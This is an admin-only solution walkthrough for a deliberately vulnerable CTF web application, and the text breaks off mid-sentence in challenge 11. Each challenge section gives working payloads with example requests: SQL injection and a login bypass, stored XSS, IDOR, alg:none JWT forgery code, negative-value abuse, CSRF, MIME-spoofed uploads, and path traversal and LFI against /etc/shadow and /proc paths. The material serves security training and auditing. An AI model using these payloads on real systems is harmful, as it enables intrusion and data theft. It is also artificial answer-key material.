# INSTANT WEB CTF — Player Solution Walkthrough (Challenges 01–11, 13)

**Admin-only document.** Every step below was re-verified live against the currently running
deployment while writing this document (no application changes were made in the process — this
is read-only verification, same containers, same code, as audited in the prior report). Actual
flag values are never printed below — each entry names the flag's environment variable and
describes exactly where/how it is revealed in-app instead.

Where the *actual* discoverability of a step differs from what an idealized "intended path"
would be, this is called out explicitly as a **DISCREPANCY**, consistent with the player-path
audit delivered previously. Nothing here contradicts that audit; this document is the detailed
walkthrough version of the same live-verified paths (working exploits) plus the same caveats
(discovery gaps) presented per-challenge instead of as a summary table.

---

## Remediation status (carried over from the prior audit — unchanged, no fixes applied)

| # | Finding | Status |
|---|---|---|
| 01 | Exact debug endpoint filename (`deploy-status-8f3a`) is not discoverable from `robots.txt` (directory-only) or anywhere else in-app | **Open** |
| 03 | Target directory/filename (`protected/flag.txt`) is not hinted anywhere in-app; relies on convention-guessing | **Open (soft)** |
| 04 | Victim email (`alexandra.chen@meridiancapital.example`) required for the bypass to reach the flag is not disclosed anywhere in-app | **Open** |
| 06 | `/invoices/:id` URL pattern is invisible to any self-registered player (empty list renders no links) | **Open (soft)** |
| 07 | Second API endpoint (`/company/api/internal/diagnostics`) is never disclosed anywhere in-app | **Open** |
| 11 | No checkout/order-creation feature exists; only the operator-seeded demo customer owns an invoice, so no self-registered player account can ever reach a working `/receipt` page | **Open (critical — structural blocker)** |
| 12 | Confirmed still disabled, untouched (no route, flag, or schema exists for it) | **N/A, unchanged** |

Nothing below works around these gaps — the walkthroughs document the exploit mechanics
faithfully, and each affected section repeats the relevant discrepancy inline so this document
stays self-contained.

---

## 01 — Information Disclosure

1. **Vulnerability class:** Information disclosure — undocumented, unauthenticated debug endpoint.
2. **Intended difficulty:** Beginner.
3. **Starting point:** The public homepage, `GET /company/`.
4. **Discovery/recon:** Standard recon checks `GET /company/robots.txt`.
5. **Endpoint(s) involved:** `GET /company/robots.txt` → `GET /company/debug/deploy-status-8f3a`.
6. **What the player observes:**
   ```
   User-agent: *
   Disallow: /debug/
   Disallow: /portal/legacy-login
   Disallow: /portal/settings/quick-unsubscribe
   ```
   This tells a player a `/debug/` path space exists and shouldn't be crawled — but not the
   specific file under it.
7. **Vulnerability explanation:** A leftover debug/status endpoint was never removed before
   launch and requires no authentication.
8. **Exploitation methodology:** Simply request the endpoint directly.
9. **Example request:**
   ```
   GET /company/debug/deploy-status-8f3a HTTP/1.1
   Host: <host>
   ```
10. **Successful exploitation looks like:** A 200 JSON response:
    ```json
    {"service":"instant-web","status":"ok","environment":"production","build":"2024.11.02-rc3",
     "deployed_by":"ci-bot","uptime_hours":0,
     "notes":"Legacy customer login retained at /portal/legacy-login for backwards compatibility
              during the Q4 auth migration - scheduled for removal. Tracking ref: <FLAG>"}
    ```
11. **Flag location:** The `notes` field of the JSON response, appended as "Tracking ref: ...".
12. **Expected flag identifier:** `FLAG_INFO_DISCLOSURE`.
13. **Prerequisites/account state:** None — fully unauthenticated.
14. **Common mistakes / dead ends:** Assuming `robots.txt`'s `Disallow: /debug/` means the file
    is literally at `/debug/` (it 404s); trying common debug filenames (`/debug/status`,
    `/debug/health`) — none of these exist.
15. **Solvable without source/SSH/.env/DB access:** Yes, once the exact path is known — see
    **DISCREPANCY** below.

**DISCREPANCY:** The exact filename `deploy-status-8f3a` is not discoverable from `robots.txt`
(directory-prefix only) or anywhere else in the live application — confirmed via full-source
grep, it appears nowhere else. As documented in the prior audit, this step currently requires
already knowing the path (e.g., from this document or source access), not genuine in-app
discovery.

**ATTACK CHAIN:**
Recon (`robots.txt`) → Discovery (`/debug/` prefix noted, exact file *not* discoverable in-app)
→ Vulnerable functionality (`GET /debug/deploy-status-8f3a`) → Exploitation (direct request, no auth)
→ Flag condition (flag present in every response's `notes` field, unconditionally)

---

## 02 — SQL Injection

1. **Vulnerability class:** SQL Injection — UNION-based, string context.
2. **Intended difficulty:** Beginner.
3. **Starting point:** `GET /company/products`, linked from the main nav.
4. **Discovery/recon:** The search box (`?q=`) is a natural fuzzing target. Submitting a single
   quote produces a generic 500 error page (no stack trace) — the classic SQLi tell.
5. **Endpoint / parameter:** `GET /company/products/search?q=` — vulnerable parameter is `q`.
6. **What the player observes:** `q=abc'` → HTTP 500 "Something went wrong." Normal input
   (`q=analytics`) → filtered product list rendered as cards.
7. **Vulnerability explanation:** `q` is concatenated directly into a double `ILIKE` clause with
   no parameterization — the one deliberate exception in an otherwise fully parameterized
   codebase:
   ```sql
   SELECT name, slug, description, price_cents, category FROM products
    WHERE name ILIKE '%<q>%' OR description ILIKE '%<q>%' ORDER BY price_cents ASC
   ```
8. **Injection strategy — UNION-based.** The vulnerable `SELECT` returns 5 columns
   (`name, slug, description, price_cents, category`), all rendered on the page (as a product
   card's category/title/price/description). A `UNION SELECT` with a matching column count and
   compatible types can pull rows from any other readable table.
9. **Determining column count/types (live-verified):**
   ```
   GET /company/products/search?q=nonexistentxyz' ORDER BY 5 --  → HTTP 200 (succeeds)
   GET /company/products/search?q=nonexistentxyz' ORDER BY 6 --  → HTTP 500 (fails)
   ```
   confirms exactly 5 columns. Types are inferred from what's already displayed (text, text,
   text, numeric, text).
10. **Reaching the intended data:** the target table name (`internal_notes`) is never shown
    anywhere in the app — it must be enumerated through the injection point itself via
    `information_schema.tables`/`information_schema.columns` (standard technique, fully
    self-service, no external knowledge needed), or guessed directly by an experienced player.
11. **Example request:**
    ```
    GET /company/products/search?q=nonexistentxyz' UNION SELECT title, reference, content, priority, tag FROM internal_notes --  HTTP/1.1
    Host: <host>
    ```
12. **Successful exploitation looks like:** A single product card renders with:
    - Category: `internal`
    - Title: `Q3 Security Audit - Action Items`
    - Price: `$0.01`
    - Description: `Product search endpoint flagged during external pen test for improper input
      handling on the "q" parameter. Tracking ref: <FLAG>. Remediate before next release.`
13. **Flag location:** In the injected row's `content` column, rendered into the product card's
    description text.
14. **Expected flag identifier:** `FLAG_SQL_INJECTION`.
15. **Prerequisites/account state:** None — fully unauthenticated, public page.
16. **Common mistakes / dead ends:** Forgetting the trailing `-- ` (leaves the original
    `ORDER BY` clause attached, causing a syntax error against the UNION); mismatching column
    count/types (also a 500); guessing common table names other than `internal_notes` (products,
    orders, etc. are legitimate/uninteresting — the useful target isn't guessable by name alone
    without schema enumeration).
17. **Solvable without source/SSH/.env/DB access:** Yes — confirmed, the entire path (including
    table discovery) is self-service through the one vulnerable parameter.

**ATTACK CHAIN:**
Recon (search box + single-quote 500) → Discovery (string-context injection, `ORDER BY`
column-count probe) → Vulnerable functionality (`GET /products/search?q=`) → Exploitation
(UNION SELECT against `internal_notes`, found via schema enumeration) → Flag condition (flag
unconditionally present in the seeded `internal_notes` row's `content` column)

---

## 03 — Path Traversal

1. **Vulnerability class:** Path traversal — off-by-one directory containment check.
2. **Intended difficulty:** Beginner.
3. **Starting point:** Customer Portal → Documents, after registering/logging in (self-registration is free).
4. **Discovery/recon:** The Documents page lists three report files, each with a `?file=` download link.
5. **Endpoint / parameter:** `GET /company/portal/documents/download?file=` — vulnerable parameter is `file`.
6. **What the player observes:** `?file=welcome-guide.txt` downloads normally.
   `?file=../../../../etc/passwd` → 400 "That file parameter is not valid." (blocked — the check
   is real, just miscalibrated one level too high).
7. **Vulnerability explanation:** The code resolves `path.resolve(documentsDir, file)` and checks
   the result starts with `challengeData.root` (the *parent* of `documentsDir`) instead of
   `documentsDir` itself — a realistic off-by-one-directory mistake. This lets traversal reach
   any **sibling** of `documents/` inside the app's own `challenge-data/` tree, but not further.
8. **Exploitation methodology:** Traverse exactly one level up into the sibling `protected/`
   directory.
9. **Example request:**
   ```
   GET /company/portal/documents/download?file=../protected/flag.txt HTTP/1.1
   Cookie: customer_sid=<session>
   ```
10. **Successful exploitation looks like:** The browser downloads/displays a small text file
    containing a single line ending in the flag reference.
11. **Flag location:** `challenge-data/protected/flag.txt`, served as-is.
12. **Expected flag identifier:** `FLAG_PATH_TRAVERSAL`.
13. **Prerequisites/account state:** Any logged-in customer account — no seeded data needed
    (this route requires only authentication, not ownership of anything).
14. **Common mistakes / dead ends:** Trying to escape all the way to real OS paths
    (`/etc/passwd`, `/root/.ssh/...`) — these are correctly blocked by the (miscalibrated but
    real) containment check; only the one-level sibling escape works.
15. **Solvable without source/SSH/.env/DB access:** Yes, once the target name is known — see
    **DISCREPANCY** below.

**DISCREPANCY:** The sibling directory/file name `protected/flag.txt` is not hinted anywhere in
the live application (confirmed via grep of all views). This is a materially smaller guess-space
than challenge 01 (a path-traversal-savvy player would routinely try "protected"/"private"/
"flag.txt" as standard convention), but strictly speaking it is not discoverable *from the
application itself* — flagged as a soft finding in the prior audit.

**ATTACK CHAIN:**
Recon (Documents page, `?file=` links) → Discovery (traversal attempt to real OS paths is
blocked, confirming a boundary exists but not its exact shape) → Vulnerable functionality
(`GET /documents/download?file=`) → Exploitation (`../protected/flag.txt`, one-level sibling
escape) → Flag condition (flag unconditionally present in that file)

---

## 04 — Authentication Bypass

1. **Vulnerability class:** Authentication bypass via SQL injection (comment-based), in a
   deprecated login flow.
2. **Intended difficulty:** Beginner.
3. **Starting point:** `robots.txt` or challenge 01's debug JSON, both naming
   `/portal/legacy-login` literally.
4. **Discovery/recon:** Visiting `GET /company/portal/legacy-login` shows a visibly old-styled
   login form, distinct from the modern `/portal/login`.
5. **Endpoint / parameters:** `POST /company/portal/legacy-login` — vulnerable parameters are
   `email` and `password`.
6. **What the player observes:** The form has no CSRF token field, unlike every other form in the
   app.
7. **Vulnerability explanation:**
   ```sql
   SELECT id, name, email, role FROM company_users
    WHERE email = '<email>' AND password_hash = '<password>' AND role = 'customer' LIMIT 1
   ```
   built via raw string concatenation. A `'` in `email` breaks out of the literal; a trailing
   `-- ` comments out the password/role checks.
8. **Exploitation methodology — targeted comment bypass.** A generic bypass
   (`email=' OR '1'='1' -- `) is **not sufficient** — verified live, it strips the `role`
   filter entirely and (with no `ORDER BY`) returns an arbitrary row that may not even be a
   `customer`-role row, producing an invalid session. The reliable payload targets the specific
   victim account by email, commenting out only the password/role checks:
   ```
   email:    alexandra.chen@meridiancapital.example' -- 
   password: (anything)
   ```
9. **Example request:**
   ```
   POST /company/portal/legacy-login HTTP/1.1
   Content-Type: application/x-www-form-urlencoded

   email=alexandra.chen%40meridiancapital.example%27+--+&password=anything
   ```
10. **Successful exploitation looks like:** HTTP 302 redirect to `/company/portal/dashboard`,
    followed by a dashboard showing an "Account Notes" card (styled distinctly, gold border) that
    ordinary accounts never have.
11. **Flag location:** Inside that "Account Notes" card's text, appended as "Internal tracking
    ref: ...".
12. **Expected flag identifier:** `FLAG_AUTH_BYPASS`.
13. **Prerequisites/account state:** None required beforehand — this *creates* the session.
14. **Common mistakes / dead ends:** Using a generic `' OR '1'='1' -- ` payload (verified live to
    fail — lands on an arbitrary/invalid row, no flag); forgetting the space before `-- ` (some
    SQL parsers require it, Postgres does); trying this against the *modern* `/portal/login`
    (parameterized, not exploitable).
15. **Solvable without source/SSH/.env/DB access:** The technique itself, yes — but see
    **DISCREPANCY** below.

**DISCREPANCY:** The specific victim email `alexandra.chen@meridiancapital.example` required to
land on the flagged account is not disclosed anywhere in the live application (confirmed via
full-source grep — it exists only in `seed.js`, never rendered to any page). A player can confirm
the SQLi bypass mechanism works, but has no in-app way to learn which account to target for the
flag specifically. Documented in the prior audit as an open finding.

**ATTACK CHAIN:**
Recon (`robots.txt` / ch01 notes → exact literal path) → Discovery (old-styled form, no CSRF
field) → Vulnerable functionality (`POST /legacy-login`, concatenated `email`/`password`) →
Exploitation (comment-bypass targeting a specific victim email — victim identity itself is the
open discrepancy) → Flag condition (flag present in that account's `notes` field, rendered only
on its own dashboard)

---

## 05 — Cross-Site Scripting (Stored)

1. **Vulnerability class:** Stored XSS — missing output encoding.
2. **Intended difficulty:** Beginner.
3. **Starting point:** Customer Portal → Support, after registering/logging in.
4. **Discovery/recon:** A normal ticket submission form (subject + message).
5. **Injection/request flow:** `POST /company/portal/support` (fields `subject`, `message`) →
   stored in `support_tickets` → rendered on `GET /company/portal/support` (and, in a live
   deployment, also on the employee ticket queue).
6. **Where the payload is stored/reflected:** `support_tickets.message`. Rendered via
   `<%- t.message %>` (EJS **raw**, unescaped output) on both `portal/support.ejs` and
   `employee/tickets.ejs` — the one deliberate unescaped exception in this app's templates.
   `subject` is rendered escaped (`<%= %>`) normally; only `message` is vulnerable.
7. **Vulnerability explanation:** Any HTML/JS in `message` executes verbatim in the browser of
   anyone who views the ticket list — genuine, not simulated, stored XSS.
8. **Example request:**
   ```
   POST /company/portal/support HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
   Cookie: customer_sid=<session>

   _csrf=<token>&subject=test&message=<script>alert(document.domain)</script>
   ```
9. **Successful exploitation looks like:** Revisiting `/company/portal/support` — in a real
   browser, the injected `<script>` executes immediately (verified: the page's raw HTML contains
   the unescaped tag).
10. **How the challenge's flag condition is triggered:** At ticket-creation time, the server
    checks (case-insensitively) whether `subject` or `message` contains a literal `<script` —
    exactly the payload shape that would execute given the unescaped rendering — and if so, sets
    `support_tickets.flagged = true`.
11. **Flag location:** Shown directly beneath the flagged ticket on the submitter's own
    `/company/portal/support` page, styled as an "automated content scanner" notice.
12. **Expected flag identifier:** `FLAG_XSS`.
13. **Prerequisites/account state:** Any logged-in customer account.
14. **Common mistakes / dead ends:** Testing only in the `subject` field (escaped, won't fire or
    flag); using a payload shape other than a literal `<script` tag (won't trigger the
    flag-awarding check, even though other tags like `<img onerror=...>` would still execute in a
    real browser).
15. **Solvable without source/SSH/.env/DB access:** Yes, fully self-contained.

**CTF simplification, documented honestly:** there is no automated "agent"/headless browser in
this environment to visit the employee queue and detonate the payload against a second victim
session. The flag is instead awarded the moment a genuinely executable payload shape is detected
server-side at submission time — this proves the payload *would* execute (the rendering is
unescaped either way) without requiring a live second-browser demonstration.

**ATTACK CHAIN:**
Recon (ticket form, visible immediately) → Discovery (no obvious sanitization messaging) →
Vulnerable functionality (`message` field, unescaped `<%- %>` render) → Exploitation (submit a
ticket containing `<script`) → Flag condition (server-side `<script` detection at creation time
flags the ticket; flag shown on the submitter's own ticket list)

---

## 06 — IDOR (Broken Object-Level Authorization)

1. **Vulnerability class:** IDOR — missing authorization check (not an auth bypass; fully
   logged-in throughout).
2. **Intended difficulty:** Easy.
3. **Starting point:** Customer Portal → Invoices, after logging in.
4. **Legitimate request first:** `GET /company/portal/invoices/<own-id>` — a normal customer
   with invoices sees their own invoice detail page linked from the invoices list, e.g.
   `/company/portal/invoices/3`.
5. **Parameter that can be manipulated:** the `:id` path segment — a small sequential integer.
6. **Malicious request:** simply change the id to another small integer not belonging to you,
   e.g. `4`.
7. **Vulnerability explanation:**
   ```sql
   SELECT i.id, i.invoice_number, i.amount_cents, i.status, i.issued_at, i.internal_memo
     FROM invoices i WHERE i.id = $1
   ```
   never joins back to `orders.customer_id` to verify the requesting customer owns that invoice.
8. **Example request:**
   ```
   GET /company/portal/invoices/4 HTTP/1.1
   Cookie: customer_sid=<any authenticated customer's session>
   ```
9. **Expected server-side behavior:** the server returns invoice `id=4` regardless of who's
   asking, including its `internal_memo` field — verified live with an account that owns zero
   invoices of its own.
10. **Successful exploitation looks like:** An invoice detail page for an invoice you never
    placed, showing an "Internal memo" box that ordinary invoices never have.
11. **Flag location:** That invoice's `internal_memo` field, appended as "Internal tracking ref: ...".
12. **Expected flag identifier:** `FLAG_IDOR`.
13. **Prerequisites/account state:** Any logged-in customer account — **does not** require owning
    any invoices yourself (verified: a freshly registered zero-invoice account can still reach
    `/invoices/4` directly and retrieve the flag).
14. **Common mistakes / dead ends:** Assuming you need your own invoice first to "unlock" the
    pattern — you don't, the check is absent entirely regardless of your own data; trying very
    large ids (only a handful of invoices are seeded, so only small integers resolve).
15. **Solvable without source/SSH/.env/DB access:** Yes, for the exploit itself — see
    **DISCREPANCY** below regarding *discovering* the URL pattern.

**DISCREPANCY:** A self-registered account's own Invoices list renders empty ("No invoices yet.")
with **no links at all**, so a genuinely fresh player never sees the `/invoices/:id` URL pattern
rendered anywhere in their own session. Reaching it requires inferring the pattern from REST
convention off the "Invoices" nav item rather than observing a real example link — noted as a
soft finding in the prior audit.

**ATTACK CHAIN:**
Recon (Invoices nav item) → Discovery (URL pattern inferred from convention, not observed —
see discrepancy) → Vulnerable functionality (`GET /invoices/:id`, no ownership join) →
Exploitation (increment/guess small integer ids) → Flag condition (flag present whenever
`internal_memo` is non-null on the returned invoice, regardless of requester identity)

---

## 07 — JWT Authentication Weakness

1. **Vulnerability class:** JWT signature-verification bypass (`alg: "none"` accepted) →
   claim/scope forgery → privilege escalation.
2. **Intended difficulty:** Easy/Intermediate.
3. **Starting point:** Customer Portal → API Tokens, after logging in.
4. **Authentication flow (legitimate):** `POST /company/portal/api-tokens/generate` issues a
   JWT: `jwt.sign({ sub: <your id>, email, scope: 'account:read' }, secret, { algorithm: 'HS256',
   expiresIn: '2h' })`, shown once on the page along with example `curl` usage against
   `GET /company/api/account`.
5. **Relevant request structure (legitimate):**
   ```
   GET /company/api/account HTTP/1.1
   Authorization: Bearer <token>
   ```
   Response: `{"account":{...},"scope":"account:read"}` — the `scope` field is directly visible
   in the response, motivating a player to wonder what other scopes might exist.
6. **What the player changes and why:** Decode the JWT (three base64url segments,
   `header.payload.signature`). Change the header from `{"alg":"HS256","typ":"JWT"}` to
   `{"alg":"none","typ":"JWT"}`, edit the payload's `scope` from `"account:read"` to
   `"admin:internal"`, then re-encode as `header.payload.` (base64url header, base64url payload,
   **empty** signature segment — trailing dot, nothing after it).
7. **How the server interprets the modified token:** `verifyApiToken` in `routes/api.js` decodes
   the header first; if `header.alg === "none"`, it trusts the payload **without ever calling
   `jwt.verify()`** — the legitimate HS256 path is skipped entirely.
8. **Example forged token construction (Node, illustrative):**
   ```js
   const b64url = s => Buffer.from(s).toString('base64').replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
   const header  = b64url(JSON.stringify({ alg: 'none', typ: 'JWT' }));
   const payload = b64url(JSON.stringify({ sub: <your id>, email: '<you>', scope: 'admin:internal' }));
   const forged  = `${header}.${payload}.`;
   ```
9. **Example request:**
   ```
   GET /company/api/internal/diagnostics HTTP/1.1
   Authorization: Bearer <forged token>
   ```
10. **Successful exploitation looks like:** HTTP 200 JSON (a legitimate token or an
    insufficient-scope forged token both get HTTP 403 `{"error":"Insufficient scope."}` from this
    same endpoint — confirmed live).
11. **Flag location:** The `internal_notice` field of the 200 response, appended as "Internal
    diagnostics scope confirmed. Tracking ref: ...".
12. **Expected flag identifier:** `FLAG_JWT`.
13. **Prerequisites/account state:** Any logged-in customer account, used once to obtain a
    legitimately-structured (but re-forgeable) starting token.
14. **Common mistakes / dead ends:** Forgetting the trailing dot (`.`) after the payload segment
    (malformed token, rejected); leaving `alg` as `HS256` while changing `scope` (signature
    verification then fails since the payload no longer matches the original signature); trying
    the forged token against `/account` only — that endpoint doesn't care about `scope` value,
    so it doesn't demonstrate the escalation.
15. **Solvable without source/SSH/.env/DB access:** The forgery technique itself, yes — but see
    **DISCREPANCY** below regarding the target endpoint.

**DISCREPANCY:** The flag-bearing endpoint path, `/company/api/internal/diagnostics`, is never
shown anywhere in the live application — not on the API Tokens page, not in the `/account`
response, not in any error message (confirmed live). A player must guess this specific path after
already having successfully forged an elevated-scope token. Documented in the prior audit as an
open finding.

**ATTACK CHAIN:**
Recon (API Tokens page, example `curl` usage) → Discovery (`scope` field visible in `/account`
response, motivating tampering) → Vulnerable functionality (`verifyApiToken`'s `alg:"none"`
bypass) → Exploitation (forge `scope:"admin:internal"` token) → Flag condition (forged token
presented to `/internal/diagnostics` — target path itself is the open discrepancy)

---

## 08 — Business Logic Flaw

1. **Vulnerability class:** Business logic flaw — missing lower-bound validation on a
   user-supplied quantity (negative-value abuse).
2. **Intended difficulty:** Intermediate.
3. **Starting point:** Customer Portal → Rewards, after logging in (works even at a starting
   balance of 0 — no seed dependency).
4. **Legitimate request first:** the Rewards page shows current balance and a redemption form;
   e.g. redeeming `50` points when the balance is `150` reduces it to `100` (verified live).
5. **Parameter that can be manipulated:** `points` in `POST /company/portal/rewards/redeem`.
6. **The malicious request pattern:** submit a large **negative** value instead of a positive one.
7. **Expected server-side state change (legitimate rule vs. actual code):** intended rule is
   "redemption must be positive and ≤ balance." The actual check is only
   `points > balance` — never checks `points > 0`. A negative `points` always satisfies
   `points > balance` being false (a negative number is less than any non-negative balance), so
   it passes, and `loyalty_points = loyalty_points - points` then **increases** the balance
   (subtracting a negative number).
8. **Example request:**
   ```
   POST /company/portal/rewards/redeem HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
   Cookie: customer_sid=<session>

   _csrf=<token>&points=-500000
   ```
9. **Successful exploitation looks like:** the Rewards page now shows a balance of `500,000` (or
   whatever magnitude was submitted) — verified live, taking an account from `0` to `500,000` in
   one request.
10. **Flag condition/location:** shown on the Rewards page once
    `company_users.loyalty_points >= 100,000` (the displayed "Platinum Concierge" tier
    threshold), as that tier's unlock "access code".
11. **Expected flag identifier:** `FLAG_BUSINESS_LOGIC`.
12. **Prerequisites/account state:** Any logged-in customer account, any starting balance
    (including 0).
13. **Common mistakes / dead ends:** Submitting a non-integer (`Number.isInteger` check rejects
    it, form re-renders with an error, no state change); assuming you need a large starting
    balance first (you don't — a single sufficiently negative redemption is enough from any
    starting point).
14. **Solvable without source/SSH/.env/DB access:** Yes, fully self-contained — the exact
    threshold (100,000) and the reward form are both directly visible on the page.

**ATTACK CHAIN:**
Recon (Rewards page, balance + redeem form + visible tier list) → Discovery (boundary-test the
numeric field with a negative value) → Vulnerable functionality (`POST /rewards/redeem`, missing
`points > 0` check) → Exploitation (large negative `points`) → Flag condition (balance crosses
100,000, flag shown inline)

---

## 09 — Cross-Site Request Forgery

1. **Vulnerability class:** CSRF — state-changing `GET` endpoint with no synchronizer-token
   protection.
2. **Intended difficulty:** Intermediate.
3. **Starting point:** Customer Portal → Settings, after logging in.
4. **Discovery:** `robots.txt` lists `Disallow: /portal/settings/quick-unsubscribe` (exact literal
   path); the Settings page itself also prints this same URL directly as a "footer preview" note
   — confirmed present in the live page text: *"Prefer not to log in? Every notification email we
   send includes a one-click unsubscribe link in the footer, shaped like:
   `/company/portal/settings/quick-unsubscribe`"*.
5. **Request flow:** The legitimate, protected way to change the preference is
   `POST /company/portal/settings/notifications` (requires the session's `_csrf` token in the
   body). The vulnerable way is `GET /company/portal/settings/quick-unsubscribe` — no token of
   any kind, and it's a `GET`, so it can be triggered by nothing more than a browser navigation
   (a link, an auto-redirecting page, or in a real cross-site scenario, an `<img src>` /
   auto-submitting form on an attacker-controlled page).
6. **Example interaction:**
   ```
   GET /company/portal/settings/quick-unsubscribe HTTP/1.1
   Cookie: customer_sid=<session>
   ```
   (no CSRF token header/field of any kind — none is checked)
7. **Where the flag condition is triggered:** the handler sets
   `email_notifications_enabled = FALSE` and, critically,
   `notification_pref_source = 'email_link'` (as opposed to `'settings_form'` for the protected
   path) — this column is what distinguishes "changed via the unprotected route" from "changed
   normally."
8. **Successful exploitation looks like:** a confirmation page ("You're unsubscribed"), then
   revisiting Settings shows a "Compliance notice" box.
9. **Flag location:** That Compliance notice box on the Settings page, shown only when
   `notification_pref_source = 'email_link'`.
10. **Expected flag identifier:** `FLAG_CSRF`.
11. **Prerequisites/account state:** Any logged-in customer account.
12. **Common mistakes / dead ends:** Using the protected `POST /settings/notifications` form
    instead (correctly requires a valid token — won't set the flag-triggering source value even
    though it changes the same underlying preference).
13. **CTF simplification, documented honestly:** there is no second "victim" browser/session in
    this environment to demonstrate a genuine cross-origin forged request landing on someone
    else's live session. The flag is instead awarded on evidence that the state-changing action
    is reachable and effective through the token-less path — which **is** the actual
    vulnerability — rather than a live cross-site demonstration. Note also: this app's session
    cookies use `SameSite=Lax`, which would block a cross-site **POST** form submission in a
    modern browser; that's exactly why the unprotected action here is a `GET` route — top-level
    cross-site navigation (a plain link or redirect) is *not* blocked by `SameSite=Lax`, keeping
    this realistic under modern default cookie behavior.
14. **Solvable without source/SSH/.env/DB access:** Yes, fully self-contained — both discovery
    paths (robots.txt and the Settings page text) are live, in-app, and redundant.

**ATTACK CHAIN:**
Recon (`robots.txt` + Settings page footer-preview text, both giving the exact URL) → Discovery
(a `GET` route performs a state change — the anti-pattern itself) → Vulnerable functionality
(`GET /settings/quick-unsubscribe`, no token check) → Exploitation (simply load the URL while
authenticated) → Flag condition (`notification_pref_source = 'email_link'` recorded, shown on
Settings page)

---

## 10 — Unrestricted File Upload

1. **Vulnerability class:** Unrestricted file upload — trusts client-declared MIME type instead
   of validating actual file content.
2. **Intended difficulty:** Intermediate.
3. **Starting point:** Customer Portal → Profile, after logging in.
4. **Discovery:** A standard avatar upload form accepting "PNG, JPEG, or GIF".
5. **Legitimate request:** uploading a real PNG (correct magic bytes `89 50 4E 47`) with
   `Content-Type: image/png` — succeeds, no flag (verified live: uploading a file starting with
   real PNG magic bytes produces **no** "Automated content scanner" notice).
6. **Vulnerable endpoint/parameter:** `POST /company/portal/profile/avatar`, multipart field
   `avatar`. The server's `fileFilter` checks only `file.mimetype` (the multipart part's
   *declared* `Content-Type`, fully attacker-controlled) against an allowlist — never the file's
   actual bytes.
7. **Exploitation methodology:** upload a non-image file while declaring an allowed image
   `Content-Type` for that specific part — the multipart request lets you set the part's
   `Content-Type` independently of the file's real content.
8. **Example request (raw multipart body, or via curl's `;type=` override):**
   ```
   curl -b "customer_sid=<session>" \
        -F "_csrf=<token>" \
        -F "avatar=@payload.txt;type=image/png" \
        https://<host>/company/portal/profile/avatar
   ```
9. **Successful exploitation looks like:** HTTP 302 redirect back to Profile (upload accepted —
   verified live, a plain-text file declaring `image/png` is accepted and stored).
10. **How the flag condition is triggered:** after saving, the server reads the file's first
    bytes and compares them against real PNG/JPEG/GIF magic-byte signatures. If they don't match
    despite the declared image type, `avatar_flagged = true` is set.
11. **Flag location:** Profile page, next to an "Automated content scanner" notice, shown only
    when `avatar_flagged` is true.
12. **Expected flag identifier:** `FLAG_FILE_UPLOAD`.
13. **Prerequisites/account state:** Any logged-in customer account.
14. **Common mistakes / dead ends:** Uploading with an honest, non-image `Content-Type`
    (e.g. `text/plain`) — correctly rejected outright with HTTP 400 "Only PNG, JPEG, or GIF
    images are allowed." (verified live); the *declared* type must be on the allowlist even
    though the *actual* content isn't.
15. **Solvable without source/SSH/.env/DB access:** Yes — the technique (per-part
    `Content-Type` spoofing in multipart uploads) is a general web-security skill, not an
    in-app secret.

**ATTACK CHAIN:**
Recon (Profile page, visible upload form) → Discovery (only declared type appears to be checked)
→ Vulnerable functionality (`fileFilter` on `file.mimetype` only) → Exploitation (spoof
`Content-Type: image/png` on a non-image file) → Flag condition (post-upload magic-byte check
detects the mismatch, sets `avatar_flagged`, flag shown on Profile)

---

## 11 — Local File Inclusion

1. **Vulnerability class:** LFI via `path.resolve()` absolute-path anchor bypass + unblocked
   relative traversal (no containment/allowlist check).
2. **Intended difficulty:** Intermediate.
3. **Starting point:** an invoice's detail page, `GET /company/portal/invoices/:id` — **only**
   reachable for an invoice the logged-in account actually owns (this route's ownership check is
   correct, unlike challenge 06).
4. **Vulnerable parameter:** `template` on `GET /company/portal/invoices/:id/receipt?template=`.
5. **Legitimate request first:**
   ```
   GET /company/portal/invoices/3/receipt?template=standard HTTP/1.1
   Cookie: customer_sid=<session of the invoice's owner>
   ```
   → plain-text rendered receipt (verified live: "standard" and "detailed" both render correctly
   with the invoice's real number/amount/status substituted into a template).
6. **Path manipulation — two independent bypasses, both verified live:**
   - **Relative traversal:** `template=../internal-billing/notes.txt`
   - **Absolute-path anchor bypass:** `template=/app/challenge-data/internal-billing/notes.txt`
     — `path.resolve(base, absolutePath)` in Node.js discards `base` entirely and returns the
     absolute path verbatim; there is no `startsWith(receiptTemplatesDir)` containment check at
     all in this route (unlike challenge 03).
   A denylist blocks a few named dangerous substrings (`/proc/`, `/etc/shadow`, `.ssh/`,
   `docker.sock`) — verified live (`template=/proc/self/environ.txt` and
   `template=/etc/shadow.txt` both return HTTP 400), but doesn't address the missing containment
   check itself. A mandatory `.txt` suffix is appended whenever the input doesn't already end in
   `.txt`, which is what keeps this bounded to `.txt`-named targets.
7. **Intended target/resource path:** `challenge-data/internal-billing/notes.txt` — a sibling
   directory of `receipt-templates/`, not inside it.
8. **How the player discovers that target:** **not discoverable from the app** — see
   **DISCREPANCY** below.
9. **Example request:**
   ```
   GET /company/portal/invoices/3/receipt?template=../internal-billing/notes.txt HTTP/1.1
   Cookie: customer_sid=<session of the invoice's owner>
   ```
10. **Successful exploitation looks like:** plain-text response containing an "Escalation queue
    notes" line ending in the flag reference (verified live via both the relative-traversal and
    absolute-path payloads).
11. **Flag location:** `challenge-data/internal-billing/notes.txt`'s contents, returned verbatim.
12. **Expected flag identifier:** `FLAG_LFI`.
13. **Prerequisites/account state:** **You must be logged in as an account that owns at least one
    real invoice.** See the critical discrepancy below — this is the blocking issue.
14. **Common mistakes / dead ends:** Trying this route while logged in as an account with no
    invoices, or against an invoice id you don't own via challenge 06's IDOR — both correctly
    404 (ownership is checked here); trying to reach `/etc/shadow` or `/proc/self/environ`
    directly — blocked both by the denylist and, independently, by the mandatory `.txt` suffix
    (neither path ends in `.txt`).
15. **Solvable without source/SSH/.env/DB access:** The exploit mechanics themselves, yes — but
    see the critical discrepancy below regarding *reaching* the feature at all.

**DISCREPANCY (critical, carried over from the prior audit):** This application has **no
checkout, purchase, or order-creation feature anywhere** — `orders`/`invoices` are pure seed
data. The only account with a real invoice is the operator-seeded demo customer
(`SEED_CUSTOMER_EMAIL`/`SEED_CUSTOMER_PASSWORD` — documented only in `.env`/
`docs/ADMIN_GUIDE.md`, never exposed to players anywhere in the app). A self-registered player —
